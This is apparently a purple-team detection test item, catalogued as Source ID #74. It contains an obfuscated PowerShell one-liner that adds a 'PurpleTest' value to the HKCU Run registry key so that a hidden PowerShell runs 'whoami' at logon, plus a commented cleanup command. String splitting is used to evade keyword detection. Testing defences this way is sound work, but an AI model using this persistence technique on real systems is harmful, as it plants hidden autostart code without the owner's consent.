# Source ID #74 — Persistence (Registry Run Key)
# Remember to clean up afterwards:
# Remove-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' -Name PurpleTest
powershell.exe -c "&('Set-'+'Item'+'Property') -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' -Name ('Purple'+'Test') -Value ('power'+'shell -no'+'p -w hid'+'den -c who'+'ami')"
